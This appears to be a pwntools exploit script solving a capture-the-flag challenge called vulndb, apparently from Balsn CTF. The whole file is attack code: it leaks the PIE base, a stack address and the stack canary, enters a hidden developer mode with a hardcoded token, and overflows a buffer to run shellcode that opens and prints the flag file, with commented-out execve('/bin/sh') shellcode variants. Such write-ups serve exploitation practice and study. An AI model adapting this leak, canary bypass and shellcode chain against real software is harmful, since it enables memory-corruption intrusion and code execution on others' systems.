#! /usr/bin/env python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'neww']

def create_db(name):
    r.sendlineafter('>>', 'Create db')
    r.sendlineafter('name:', name)
    print(r.recvline())

def delete_db(idx):
    r.sendlineafter('>>', 'Delete db')
    r.sendlineafter('id:', str(idx))

def select_db(idx):
    r.sendlineafter('>>', 'Select db')
    r.sendlineafter('id:', str(idx))

# TODO more = 'yes'
def create_table(tb_name, col_name, col_type, more='no'):
    r.sendlineafter('>>', 'Create table')
    r.sendlineafter('Table name:', tb_name)
    r.sendlineafter('Column name:', col_name)
    r.sendlineafter(':', str(col_type))
    r.sendlineafter('?', more)

def Drop_table(name):
    r.sendlineafter('>>', 'Drop table')
    r.sendlineafter('name:', name)
    print(r.recvline())

def insert(tb_name):
    r.sendlineafter('>>', 'Insert')
    query = r.recvuntil(':', timeout=1)
    while(query[0] == '[' and query[-2] == ':'):
        print(query)
        data = input()
        r.sendline(data)

def select_all(tb_name):
    r.sendlineafter('>>', 'Select all')
    r.sendlineafter('name:', tb_name)

def select(tb_name, row_id):
    r.sendlineafter('>>', 'Select')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    print(r.recvuntil('[')[:-1])

def delete(tb_name, row_id):
    r.sendlineafter('>>', 'Delete')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))

def update(tb_name, row_id, data):
    r.sendlineafter('>>', 'Update')
    r.sendlineafter('name:', tb_name)
    r.sendlineafter('id:', str(row_id))
    r.sendlineafter(':', str(data))


def develop_mode(token='', data=''):
    r.sendlineafter('>>', 'developer mode')
    r.sendafter(':', token)
    if len(data):
        print(r.recvline())
        r.sendline(data)

def disconnect():
    r.sendlineafter('>>', 'Disconnect')
    print(r.recvline())


# libc = ELF('./libc.so.1')
# r = process('./vulndb', env={"LD_LIBRARY_PATH":"."})
r = process('./wrapper', env={"LD_LIBRARY_PATH":"."})
r.sendafter('>>', 'a'*0x7+'x')
r.recvuntil('x')
pie_base = u64(r.recvline().strip()+b'\x00'*2) - 0x1360
print("pie_base @ ", hex(pie_base))

r.sendafter('>>', 'a'*0xf+'x')
r.recvuntil('x')
stack = u64(r.recvline().strip()+b'\x00'*2)
print("stack @ ", hex(stack))


r.sendafter('>>', 'a'*0x18+'x')
r.recvuntil('x')
canary = u64(b'\x00'+r.recvline().strip())
print("canary = ", hex(canary))

Balsn = pie_base + 0x4601
print("Balsn @", hex(Balsn))
develop_mode('Balsn_\x13\x37')

# raw_input('>')
# gdb.attach(r, 'b *$_pie()+0x31e7')

# shellcode = asm('''
#     mov rax, 59
#     xor rdi, rdi
#     xor rsi, rsi
#     xor rdx, rdx
#     syscall
# ''')
#shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# shellcode = asm(shellcraft.sh())
data = pie_base + 27136
shellcode = asm('''
    mov rax, 2
    mov rdi, ''' + str(stack - 182) + '''
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov r8, rax
    mov rdi, rax
    mov rsi, ''' + str(data) + '''
    mov rdx, 0x100
    mov rax, 0
    syscall
    mov rdi, 1
    mov rsi, ''' + str(data) + '''
    mov rdx, 0x100
    mov rax, 1
    syscall
''')
ra = stack - 0x110
payload = b'a'*0x78 + p64(ra) + shellcode + b'/home/vulndb/flag'
r.sendlineafter(':', payload)

r.recvuntil(b'balsn')
flag = r.recvuntil(b'}')


print('balsn' + flag.decode())
